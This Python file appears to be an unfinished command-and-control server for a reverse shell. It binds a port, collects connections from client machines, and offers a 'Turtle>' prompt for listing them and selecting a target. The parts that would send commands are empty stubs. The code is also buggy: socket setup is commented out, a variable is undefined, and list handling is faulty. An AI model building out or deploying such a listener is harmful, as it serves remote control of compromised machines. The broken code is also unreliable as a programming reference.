import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue  = Queue()
all_connections = []
all_address = []

def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Creation of socket has error" + str(msg))

def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Bind socket error " + str(msg))


#handling connections from multiple clients
def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1) #Prevent server timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has established " + str(address[0]))

        except: 
            print("Error accepting connection")


def start_turtle():
    cmd = input("Turtle> ");
    if cmd == "list":
        list_connections()
    elif 'select' in cmd:
        get_target(cmd)
        if conn is not None:
            select_target_commands(conn)
    else:
        print("Command not recognized")



def select_target_commands(conn):
    pass

def list_connections():
    results = ""
    
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results = str(i)+" "+ str(all_address[i][0]) + " " + str(all_address[i][1])+"\n"
    
    print("--- clients ----\n" + results )

def get_target(cmd):
    pass

    



# create_socket()
# bind_socket()


input("turtle> ")

